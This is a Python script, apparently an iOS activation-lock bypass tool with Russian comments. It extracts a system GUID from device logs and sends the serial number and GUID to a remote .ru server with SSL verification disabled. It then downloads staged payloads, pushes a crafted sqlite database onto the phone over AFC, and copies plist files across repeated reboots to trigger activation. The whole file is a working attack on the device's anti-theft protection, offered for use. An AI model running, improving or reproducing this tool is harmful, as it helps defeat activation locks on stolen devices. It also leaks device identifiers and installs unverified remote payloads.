import sys
import os
import time
import subprocess
import re
import shutil
import sqlite3
import atexit
import urllib.parse
import json
import struct
import binascii
from collections import Counter
from pathlib import Path

def get_bundle_path():
    """Получает путь к ресурсам в .app bundle"""
    if getattr(sys, 'frozen', False):
        # Мы внутри .app
        bundle_path = Path(sys.executable).parent.parent.parent
        resources_path = bundle_path / 'Contents' / 'Resources'
        return resources_path
    else:
        # Обычный Python
        return Path.cwd()

def find_binary(bin_name):
    """Ищет бинарник в bundle или системе"""
    resources_path = get_bundle_path()
    bundle_bin_path = resources_path / 'bin' / bin_name
    
    # Пробуем bundle сначала
    if bundle_bin_path.exists():
        return str(bundle_bin_path)
    
    # Пробуем системные пути
    system_paths = ['/usr/local/bin', '/opt/homebrew/bin', '/usr/bin']
    for path in system_paths:
        sys_bin_path = Path(path) / bin_name
        if sys_bin_path.exists():
            return str(sys_bin_path)
    
    return None

class Style:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'

class BypassAutomation:
    def __init__(self, auto_confirm_guid=False):
        self.api_url = "https://codex-r1nderpest-a12.ru/get2.php"
        self.timeouts = {
            'asset_wait': 300,
            'asset_delete_delay': 15,
            'reboot_wait': 300,
            'syslog_collect': 180
        }
        self.mount_point = os.path.join(os.path.expanduser("~"), f".ifuse_mount_{os.getpid()}")
        self.afc_mode = None
        self.device_info = {}
        self.guid = None
        self.attempt_count = 0
        self.max_attempts = 10
        self.auto_confirm_guid = auto_confirm_guid
        atexit.register(self._cleanup)

    def log(self, msg, level='info'):
        if level == 'info':
            print(f"{Style.GREEN}[✓]{Style.RESET} {msg}")
        elif level == 'error':
            print(f"{Style.RED}[✗]{Style.RESET} {msg}")
        elif level == 'warn':
            print(f"{Style.YELLOW}[⚠]{Style.RESET} {msg}")
        elif level == 'step':
            print(f"\n{Style.BOLD}{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
            print(f"{Style.BOLD}{Style.BLUE}▶{Style.RESET} {Style.BOLD}{msg}{Style.RESET}")
            print(f"{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
        elif level == 'detail':
            print(f"{Style.DIM}  ╰─▶{Style.RESET} {msg}")
        elif level == 'success':
            print(f"{Style.GREEN}{Style.BOLD}[✓ SUCCESS]{Style.RESET} {msg}")
        elif level == 'attempt':
            print(f"{Style.CYAN}[🔄 Attempt {self.attempt_count}/{self.max_attempts}]{Style.RESET} {msg}")

    def _run_cmd(self, cmd, timeout=None):
        """Запускает команду с поддержкой .app bundle"""
        # Преобразуем команду для использования бинарников из bundle
        if isinstance(cmd, list) and cmd:
            bin_name = cmd[0]
            full_path = find_binary(bin_name)
            if full_path:
                cmd[0] = full_path
        
        elif isinstance(cmd, str):
            parts = cmd.split()
            if parts:
                bin_name = parts[0]
                full_path = find_binary(bin_name)
                if full_path:
                    cmd = cmd.replace(bin_name, full_path, 1)
        
        # Настраиваем окружение для .app
        env = os.environ.copy()
        resources_path = get_bundle_path()
        
        # Добавляем bin директорию в PATH
        bin_dir = resources_path / 'bin'
        if bin_dir.exists():
            env['PATH'] = str(bin_dir) + ':' + env.get('PATH', '')
        
        # Добавляем lib директорию для библиотек
        lib_dir = resources_path / 'lib'
        if lib_dir.exists():
            env['DYLD_LIBRARY_PATH'] = str(lib_dir) + ':' + env.get('DYLD_LIBRARY_PATH', '')
        
        try:
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True, 
                timeout=timeout,
                shell=isinstance(cmd, str),
                env=env
            )
            return result.returncode, result.stdout, result.stderr
            
        except subprocess.TimeoutExpired:
            return -1, "", "Command timed out"
        except Exception as e:
            return -1, "", str(e)
        
    def wait_for_file(self, file_path, timeout=60):
        """Ожидание появления файла с таймаутом"""
        self.log(f"⏳ Waiting for {file_path}...", "detail")
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if self.afc_mode == "ifuse":
                if self.mount_afc():
                    fpath = self.mount_point + file_path
                    if os.path.exists(fpath):
                        file_size = os.path.getsize(fpath)
                        if file_size > 0:
                            self.log(f"✅ File found ({file_size} bytes)", "success")
                            return True
            else:
                # Проверка через pymobiledevice3
                tmp_file = f"temp_check_{os.getpid()}.tmp"
                code, _, _ = self._run_cmd(["pymobiledevice3", "afc", "pull", file_path, tmp_file])
                if code == 0 and os.path.exists(tmp_file):
                    file_size = os.path.getsize(tmp_file)
                    os.remove(tmp_file)
                    if file_size > 0:
                        self.log(f"✅ File found ({file_size} bytes)", "success")
                        return True
            
            time.sleep(5)
            self.log("  ▫ Still waiting...", "detail")
        
        self.log(f"❌ Timeout waiting for {file_path}", "error")
        return False    

    def _curl_download(self, url, output_file):
        """Download with SSL verification disabled"""
        curl_cmd = [
            "curl", "-L", 
            "-k",  # ← КЛЮЧЕВОЕ: отключает проверку SSL
            "-f",  # Fail on HTTP errors
            "--connect-timeout", "30",
            "--max-time", "120",
            "-o", output_file,
            url
        ]
        
        self.log(f"Downloading: {url}", "detail")
        code, out, err = self._run_cmd(curl_cmd)
        
        if code != 0:
            self.log(f"Download failed (code {code}): {err}", "error")
            return False
            
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            self.log(f"Download successful: {os.path.getsize(output_file)} bytes", "info")
            return True
        else:
            self.log("Download failed: empty file", "error")
            return False

    def reboot_device(self):
        """Reboots device and waits for readiness"""
        self.log("Rebooting device...", "step")
        
        # Try using pymobiledevice3 for reboot
        code, _, err = self._run_cmd(["pymobiledevice3", "restart"])
        if code != 0:
            # Fallback to idevicediagnostics
            code, _, err = self._run_cmd(["idevicediagnostics", "restart"])
            if code != 0:
                self.log(f"Soft reboot failed: {err}", "warn")
                self.log("Please reboot device manually and press Enter to continue...", "warn")
                input()
                return True
        
        self.log("Device reboot command sent, waiting for reconnect...", "info")
        
        # Wait for device reboot
        for i in range(60):  # 60 attempts × 5 seconds = 5 minutes
            time.sleep(5)
            code, _, _ = self._run_cmd(["ideviceinfo"])
            if code == 0:
                self.log(f"Device reconnected after {i * 5} seconds", "success")
                # Give device extra time for full boot
                time.sleep(10)
                return True
            
            if i % 6 == 0:  # Every 30 seconds
                self.log(f"Still waiting for device... ({i * 5} seconds)", "detail")
        
        self.log("Device did not reconnect in time", "error")
        return False

    def verify_dependencies(self):
        self.log("Verifying System Requirements...", "step")
        
        # Проверяем доступность бинарников
        required_bins = ['ideviceinfo', 'idevice_id']
        for bin_name in required_bins:
            path = find_binary(bin_name)
            if path:
                self.log(f"✅ {bin_name}: {path}", "info")
            else:
                self.log(f"❌ {bin_name}: Not found", "error")
                raise Exception(f"Required binary not found: {bin_name}")
        
        if find_binary("ifuse"):
            self.afc_mode = "ifuse"
            self.log("✅ ifuse found - using ifuse mode", "info")
        else:
            self.afc_mode = "pymobiledevice3"
            self.log("⚠ ifuse not found - using pymobiledevice3 mode", "warn")

    def mount_afc(self):
        if self.afc_mode != "ifuse":
            return True
        os.makedirs(self.mount_point, exist_ok=True)
        code, out, _ = self._run_cmd(["mount"])
        if self.mount_point in out:
            return True
        for i in range(5):
            code, _, _ = self._run_cmd(["ifuse", self.mount_point])
            if code == 0:
                return True
            time.sleep(2)
        self.log("Failed to mount via ifuse", "error")
        return False

    def unmount_afc(self):
        if self.afc_mode == "ifuse" and os.path.exists(self.mount_point):
            self._run_cmd(["umount", self.mount_point])
            try:
                os.rmdir(self.mount_point)
            except OSError:
                pass

    def _cleanup(self):
        """Ensure cleanup on exit"""
        self.unmount_afc()

    def detect_device(self):
        self.log("Detecting Device...", "step")
        code, out, err = self._run_cmd(["ideviceinfo"])
        if code != 0:
            self.log(f"Device not found. Error: {err or 'Unknown'}", "error")
            raise Exception("No device detected")
        
        info = {}
        for line in out.splitlines():
            if ": " in line:
                key, val = line.split(": ", 1)
                info[key.strip()] = val.strip()
        self.device_info = info
        
        print(f"\n{Style.BOLD}Device: {info.get('ProductType','Unknown')} (iOS {info.get('ProductVersion','?')}){Style.RESET}")
        print(f"UDID: {info.get('UniqueDeviceID','?')}")
        
        if info.get('ActivationState') == 'Activated':
            print(f"{Style.YELLOW}Warning: Device already activated.{Style.RESET}")

    def afc_copy(self, src_path: str, dst_path: str) -> bool:
        try:
            if self.afc_mode == "ifuse":
                if not self.mount_afc():
                    raise RuntimeError("ifuse remount failed")
                src_local = self.mount_point + src_path
                dst_local = self.mount_point + dst_path
                if not os.path.exists(src_local) or os.path.getsize(src_local) == 0:
                    return False
                os.makedirs(os.path.dirname(dst_local), exist_ok=True)
                shutil.copy2(src_local, dst_local)
                return True
            else:
                tmp = "temp_plist_copy.plist"
                code, _, err = self._run_cmd(["pymobiledevice3", "afc", "pull", src_path, tmp])
                if code != 0 or not os.path.exists(tmp) or os.path.getsize(tmp) == 0:
                    if os.path.exists(tmp):
                        os.remove(tmp)
                    return False
                code2, _, err2 = self._run_cmd(["pymobiledevice3", "afc", "push", tmp, dst_path])
                if os.path.exists(tmp):
                    os.remove(tmp)
                return code2 == 0
        except Exception as e:
            self.log(f"afc_copy failed: {e}", "error")
            return False            

    def get_guid_manual(self):
        """Manual GUID input with validation"""
        print(f"\n{Style.YELLOW}⚠ GUID Input Required{Style.RESET}")
        print(f"   Format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX")
        print(f"   Example: 2A22A82B-C342-444D-972F-5270FB5080DF")
        
        UUID_PATTERN = re.compile(r'^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$', re.IGNORECASE)
        
        while True:
            guid_input = input(f"\n{Style.BLUE}➤ Enter SystemGroup GUID:{Style.RESET} ").strip()
            if UUID_PATTERN.match(guid_input):
                return guid_input.upper()
            print(f"{Style.RED}❌ Invalid format. Must be 8-4-4-4-12 hex characters (e.g. 2A22A82B-C342-444D-972F-5270FB5080DF).{Style.RESET}")

    def parse_tracev3_structure(self, data):
        """Parses tracev3 file structure for more precise search"""
        signatures = []
        
        # Search for database-related strings
        db_patterns = [
            b'BLDatabaseManager',
            b'BLDatabase',
            b'BLDatabaseManager.sqlite', 
            b'bookassetd [Database]: Store is at file:///private/var/containers/Shared/SystemGroup',
        ]
        
        for pattern in db_patterns:
            pos = 0
            while True:
                pos = data.find(pattern, pos)
                if pos == -1:
                    break
                signatures.append(('string', pattern, pos))
                pos += len(pattern)
        
        return signatures

    def extract_guid_candidates(self, data, context_pos, window_size=512):
        """Extracts GUIDs with contextual analysis"""
        candidates = []
        
        # Extended GUID pattern
        guid_pattern = re.compile(
            rb'([0-9A-F]{8}[-][0-9A-F]{4}[-][0-9A-F]{4}[-][0-9A-F]{4}[-][0-9A-F]{12})',
            re.IGNORECASE
        )
        
        # Search in context window
        start = max(0, context_pos - window_size)
        end = min(len(data), context_pos + window_size)
        context_data = data[start:end]
        
        # GUID search
        for match in guid_pattern.finditer(context_data):
            guid = match.group(1).decode('ascii').upper()
            relative_pos = match.start() + start - context_pos
            
            # Extended GUID validation
            if self.validate_guid_structure(guid):
                candidates.append({
                    'guid': guid,
                    'position': relative_pos,
                    'context': self.get_context_string(context_data, match.start(), match.end())
                })
        
        return candidates

    def validate_guid_structure(self, guid):
        """Extended GUID structure validation"""
        try:
            # Check GUID version (RFC 4122)
            parts = guid.split('-')
            if len(parts) != 5:
                return False
            
            # Check part lengths
            if len(parts[0]) != 8 or len(parts[1]) != 4 or len(parts[2]) != 4 or len(parts[3]) != 4 or len(parts[4]) != 12:
                return False
            
            # Check hex characters
            hex_chars = set('0123456789ABCDEF')
            clean_guid = guid.replace('-', '')
            if not all(c in hex_chars for c in clean_guid):
                return False
            
            # Check version (4th character of 3rd group should be 4)
            version_char = parts[2][0]
            if version_char not in '4':
                return False  # iOS commonly uses version 4
            
            # Check variant (8,9,A,B - 2 high bits)
            variant_char = parts[3][0]
            if variant_char not in '89AB':
                return False
            
            return True
            
        except Exception:
            return False

    def get_context_string(self, data, start, end, context_size=50):
        """Gets context string around GUID"""
        context_start = max(0, start - context_size)
        context_end = min(len(data), end + context_size)
        
        context = data[context_start:context_end]
        try:
            # Try to decode as text
            return context.decode('utf-8', errors='replace')
        except:
            # For binary data show hex
            return binascii.hexlify(context).decode('ascii')

    def analyze_guid_confidence(self, guid_candidates):
        """Analyzes confidence in found GUIDs"""
        if not guid_candidates:
            return None
        
        # Group by GUID
        guid_counts = Counter(candidate['guid'] for candidate in guid_candidates)
        
        # Calculate score for each GUID
        scored_guids = []
        for guid, count in guid_counts.items():
            score = count * 10  # Base score by occurrence count
            
            # Additional confidence factors
            positions = [c['position'] for c in guid_candidates if c['guid'] == guid]
            
            # Preference for GUIDs close to BLDatabaseManager
            close_positions = [p for p in positions if abs(p) < 100]
            if close_positions:
                score += len(close_positions) * 5
            
            # Preference for GUIDs before BLDatabaseManager (more common in logs)
            before_positions = [p for p in positions if p < 0]
            if before_positions:
                score += len(before_positions) * 3
            
            scored_guids.append((guid, score, count))
        
        # Sort by score
        scored_guids.sort(key=lambda x: x[1], reverse=True)
        return scored_guids

    def confirm_guid_manual(self, guid):
        """Requests manual confirmation — bypassed in auto mode"""
        if self.auto_confirm_guid:
            self.log(f"[AUTO] Low-confidence GUID auto-approved: {guid}", "info")
            return True
        else:
            # Оригинальный интерактивный запрос (для CLI)
            print(f"Proposed GUID: {Style.BOLD}{guid}{Style.RESET}")
            print(f"This GUID has lower confidence score. Please verify:")
            print(f"1. Check if this matches GUID from other sources")
            print(f"2. Verify the format looks correct")
            
            response = input(f"\n{Style.BLUE}Use this GUID? (y/N):{Style.RESET} ").strip().lower()
            return response in ['y', 'yes']

    def get_guid_enhanced(self):
        """Enhanced GUID extraction version"""
        self.attempt_count += 1
        self.log(f"GUID search attempt {self.attempt_count}/{self.max_attempts}", "attempt")
        
        udid = self.device_info['UniqueDeviceID']
        log_path = f"{udid}.logarchive"
        
        try:
            # Collect logs
            self.log("Collecting device logs...", "detail")
            code, _, err = self._run_cmd(["pymobiledevice3", "syslog", "collect", log_path], timeout=120)
            if code != 0:
                self.log(f"Log collection failed: {err}", "error")
                return None
            
            trace_file = os.path.join(log_path, "logdata.LiveData.tracev3")
            if not os.path.exists(trace_file):
                self.log("tracev3 file not found", "error")
                return None
            
            # Read and analyze file
            with open(trace_file, 'rb') as f:
                data = f.read()
            
            size_mb = len(data) / (1024 * 1024)
            self.log(f"Analyzing tracev3 ({size_mb:.1f} MB)...", "detail")
            
            # Search for key structures
            signatures = self.parse_tracev3_structure(data)
            self.log(f"Found {len(signatures)} relevant signatures", "detail")
            
            # Collect GUID candidates
            all_candidates = []
            bl_database_positions = []
            
            for sig_type, pattern, pos in signatures:
                if pattern == b'BLDatabaseManager':
                    bl_database_positions.append(pos)
                    candidates = self.extract_guid_candidates(data, pos)
                    all_candidates.extend(candidates)
                    
                    if candidates:
                        self.log(f"Found {len(candidates)} GUID candidates near BLDatabaseManager at 0x{pos:x}", "detail")
            
            if not all_candidates:
                self.log("No valid GUID candidates found", "error")
                return None
            
            # Confidence analysis
            scored_guids = self.analyze_guid_confidence(all_candidates)
            if not scored_guids:
                return None
            
            # Log results
            self.log("GUID confidence analysis:", "info")
            for guid, score, count in scored_guids[:5]:
                self.log(f"  {guid}: score={score}, occurrences={count}", "detail")
            
            best_guid, best_score, best_count = scored_guids[0]
            
            # Determine confidence level
            if best_score >= 30:
                confidence = "HIGH"
                self.log(f"✅ HIGH CONFIDENCE: {best_guid} (score: {best_score})", "success")
            elif best_score >= 15:
                confidence = "MEDIUM" 
                self.log(f"⚠️ MEDIUM CONFIDENCE: {best_guid} (score: {best_score})", "warn")
            else:
                confidence = "LOW"
                self.log(f"⚠️ LOW CONFIDENCE: {best_guid} (score: {best_score})", "warn")
            
            # Additional verification for low confidence
            if confidence in ["LOW", "MEDIUM"]:
                self.log("Requesting manual confirmation for low-confidence GUID...", "warn")
                if not self.confirm_guid_manual(best_guid):
                    return None
            
            return best_guid
            
        finally:
            # Cleanup
            if os.path.exists(log_path):
                shutil.rmtree(log_path)

    def get_guid_auto_with_retry(self):
        """Auto-detect GUID with reboot retry mechanism"""
        self.attempt_count = 0
        
        while self.attempt_count < self.max_attempts:
            guid = self.get_guid_enhanced()
            
            if guid:
                return guid
            
            # If not last attempt - reboot device
            if self.attempt_count < self.max_attempts:
                self.log(f"GUID not found in attempt {self.attempt_count}. Rebooting device and retrying...", "warn")
                
                if not self.reboot_device():
                    self.log("Failed to reboot device, continuing anyway...", "warn")
                
                # After reboot re-detect device
                self.log("Re-detecting device after reboot...", "detail")
                self.detect_device()
                
                # Small pause before next attempt
                time.sleep(5)
            else:
                self.log(f"All {self.max_attempts} attempts exhausted", "error")
        
        return None

    def get_guid_auto(self):
        """Auto-detect GUID using enhanced method with retry"""
        return self.get_guid_auto_with_retry()

    def get_all_urls_from_server(self, prd, guid, sn):
        """Requests all three URLs (stage1, stage2, stage3) from the server"""
        params = f"prd={prd}&guid={guid}&sn={sn}"
        url = f"{self.api_url}?{params}"

        self.log(f"Requesting all URLs from server: {url}", "detail")
        
        # Используем curl с отключенной SSL проверкой
        code, out, err = self._run_cmd(["curl", "-s", "-k", url])  # ← -k добавлено здесь
        if code != 0:
            self.log(f"Server request failed: {err}", "error")
            return None, None, None

        try:
            data = json.loads(out)
            if data.get('success'):
                stage1_url = data['links']['step1_fixedfile']
                stage2_url = data['links']['step2_bldatabase']
                stage3_url = data['links']['step3_final']
                return stage1_url, stage2_url, stage3_url
            else:
                self.log("Server returned error response", "error")
                return None, None, None
        except json.JSONDecodeError:
            self.log("Server did not return valid JSON", "error")
            return None, None, None

    def preload_stage(self, stage_name, stage_url):
        """Pre-load individual stage with SSL bypass"""
        self.log(f"Pre-loading: {stage_name}...", "detail")
        
        # Используем нашу улучшенную функцию загрузки
        temp_file = f"temp_{stage_name}"
        success = self._curl_download(stage_url, temp_file)
        
        if success:
            self.log(f"Successfully pre-loaded {stage_name}", "info")
            # Удаляем временный файл
            if os.path.exists(temp_file):
                os.remove(temp_file)
            return True
        else:
            self.log(f"Warning: Failed to pre-load {stage_name}", "warn")
            return False

    def run(self):
        os.system('clear')
        print(f"{Style.BOLD}{Style.MAGENTA}iOS Activation Tool - Professional Edition{Style.RESET}\n")
        
        self.verify_dependencies()
        self.detect_device()
        
        print(f"\n{Style.CYAN}GUID Detection Options:{Style.RESET}")
        print(f"  1. {Style.GREEN}Auto-detect from device logs (with retry){Style.RESET}")
        print(f"  2. {Style.YELLOW}Manual input{Style.RESET}")
        
        choice = input(f"\n{Style.BLUE}➤ Choose option (1/2):{Style.RESET} ").strip()
        
        if choice == "1":
            self.guid = self.get_guid_auto()
            if self.guid:
                self.log(f"Auto-detected GUID after {self.attempt_count} attempt(s): {self.guid}", "success")
            else:
                self.log(f"Could not auto-detect GUID after {self.attempt_count} attempts, falling back to manual input", "warn")
                self.guid = self.get_guid_manual()
        else:
            self.guid = self.get_guid_manual()
        
        self.log(f"Using GUID: {self.guid}", "info")
        
        input(f"\n{Style.YELLOW}Press Enter to deploy payload with this GUID...{Style.RESET}")

        # 2. API Call & Get All URLs
        self.log("Requesting All Payload Stages from Server...", "step")
        prd = self.device_info['ProductType']
        sn = self.device_info['SerialNumber']
        
        stage1_url, stage2_url, stage3_url = self.get_all_urls_from_server(prd, self.guid, sn)
        
        if not stage1_url or not stage2_url or not stage3_url:
            self.log("Failed to get URLs from server", "error")
            sys.exit(1)
        
        self.log(f"Stage1 URL: {stage1_url}", "detail")
        self.log(f"Stage2 URL: {stage2_url}", "detail")
        self.log(f"Stage3 URL: {stage3_url}", "detail")

        # 3. Pre-download all stages с SSL bypass
        self.log("Pre-loading all payload stages...", "step")
        stages = [
            ("stage1", stage1_url),
            ("stage2", stage2_url), 
            ("stage3", stage3_url)
        ]
        
        for stage_name, stage_url in stages:
            self.preload_stage(stage_name, stage_url)
            time.sleep(1)

        # 4. Download & Validate final payload (stage3)
        self.log("Downloading final payload...", "step")
        local_db = "downloads.28.sqlitedb"
        if os.path.exists(local_db):
            os.remove(local_db)
        
        # Используем улучшенную загрузку
        if not self._curl_download(stage3_url, local_db):
            self.log("Final payload download failed", "error")
            sys.exit(1)

        # Validate database
        self.log("Validating payload database...", "detail")
        conn = sqlite3.connect(local_db)
        try:
            res = conn.execute("SELECT count(*) FROM sqlite_master WHERE type='table' AND name='asset'")
            if res.fetchone()[0] == 0:
                raise Exception("Invalid DB - no asset table found")
            
            res = conn.execute("SELECT COUNT(*) FROM asset")
            count = res.fetchone()[0]
            if count == 0:
                raise Exception("Invalid DB - no records in asset table")
                
            self.log(f"Database validation passed - {count} records found", "info")
            
            res = conn.execute("SELECT pid, url, local_path FROM asset")
            for row in res.fetchall():
                self.log(f"Record {row[0]}: {row[1]} -> {row[2]}", "detail")
                
        except Exception as e:
            self.log(f"Invalid payload received: {e}", "error")
            sys.exit(1)
        finally:
            conn.close()
        
        # 5. Upload
        self.log("Uploading Payload via AFC...", "step")
        target = "/Downloads/downloads.28.sqlitedb"
        
        if self.afc_mode == "ifuse":
            if not self.mount_afc():
                self.log("Mounting failed — falling back to pymobiledevice3", "warn")
                self.afc_mode = "pymobiledevice3"
        
        if self.afc_mode == "ifuse":
            fpath = self.mount_point + target
            if os.path.exists(fpath):
                os.remove(fpath)
            shutil.copy(local_db, fpath)
            self.log("Uploaded via ifuse", "info")
        else:
            self._run_cmd(["pymobiledevice3", "afc", "rm", target])
            code, _, err = self._run_cmd(["pymobiledevice3", "afc", "push", local_db, target])
            if code != 0:
                self.log(f"AFC upload failed: {err}", "error")
                sys.exit(1)
            self.log("Uploaded via pymobiledevice3", "info")
            
        self.log("✅ Payload Deployed Successfully", "success")
        
        # 6. Cleanup WAL/SHM files
        self.log("Cleaning up WAL/SHM files in /Downloads...", "step")
        for wal_file in ["/Downloads/downloads.28.sqlitedb-wal", "/Downloads/downloads.28.sqlitedb-shm"]:
            if self.afc_mode == "ifuse":
                fpath = self.mount_point + wal_file
                if os.path.exists(fpath):
                    try:
                        os.remove(fpath)
                        self.log(f"Removed {wal_file} via ifuse", "info")
                    except Exception as e:
                        self.log(f"Failed to remove {wal_file}: {e}", "warn")
            else:
                code, _, err = self._run_cmd(["pymobiledevice3", "afc", "rm", wal_file])
                if code == 0:
                    self.log(f"Removed {wal_file} via pymobiledevice3", "info")
                else:
                    if "ENOENT" not in err and "No such file" not in err:
                        self.log(f"Warning removing {wal_file}: {err}", "warn")
                    else:
                        self.log(f"{wal_file} not present — OK", "detail")

        # === STAGE 1: FIRST REBOOT + COPY TO /Books/ ===
        self.log("🔄 STAGE 1: First reboot + copy to /Books/...", "step")
        if not self.reboot_device():
            self.log("⚠ First reboot failed — continuing anyway", "warn")

        self.log("Waiting 30 seconds for iTunesMetadata.plist to appear...", "detail")
        for _ in range(3):  # 6 × 5s = 30s
            time.sleep(5)
            self.log("  ▫ Waiting...", "detail")

        src = "/iTunes_Control/iTunes/iTunesMetadata.plist"
        dst_books = "/Books/iTunesMetadata.plist"

        # Copy → /Books/
        self.log(f"Copying {src} → {dst_books}...", "info")
        if self.afc_copy(src, dst_books):
            self.log("✅ Copied to /Books/ successfully", "success")
        else:
            self.log("⚠ /iTunes_Control/iTunes/iTunesMetadata.plist not found — skipping copy to /Books/", "warn")

        # === STAGE 2: SECOND REBOOT + COPY BACK ===
        self.log("🔄 STAGE 2: Second reboot + copy back to /iTunes_Control/...", "step")
        if not self.reboot_device():
            self.log("⚠ Second reboot failed — continuing anyway", "warn")

        # Copy back: /Books/ → /iTunes_Control/iTunes/
        self.log(f"Copying {dst_books} → {src}...", "info")
        if self.afc_copy(dst_books, src):
            self.log("✅ Copied back to /iTunes_Control/ successfully", "success")
        else:
            self.log("⚠ /Books/iTunesMetadata.plist missing — copy-back skipped", "warn")

        # Wait 15 seconds — bookassetd processes the plist copy
        self.log("⏸ Holding 15s for bookassetd...", "detail")
        time.sleep(40)

        # === FINAL REBOOT ===
        self.log("🔄 Final reboot to trigger MobileActivation...", "step")
        self.reboot_device()
        
        # ✅ Final success banner
        print(f"\n{Style.GREEN}{Style.BOLD}🎉 АКТИВАЦИЯ ЗАВЕРШЕНА УСПЕШНО!{Style.RESET}")
        print(f"{Style.CYAN}→ GUID: {Style.BOLD}{self.guid}{Style.RESET}")
        print(f"{Style.CYAN}→ Payload deployed, plist synced ×2, 3 reboots performed.{Style.RESET}")
        print(f"\n{Style.YELLOW}📌 Что делать дальше:{Style.RESET}")


if __name__ == "__main__":
    try:
        BypassAutomation().run()
    except KeyboardInterrupt:
        print(f"\n{Style.YELLOW}Interrupted by user.{Style.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Style.RED}Fatal error: {e}{Style.RESET}")
        sys.exit(1)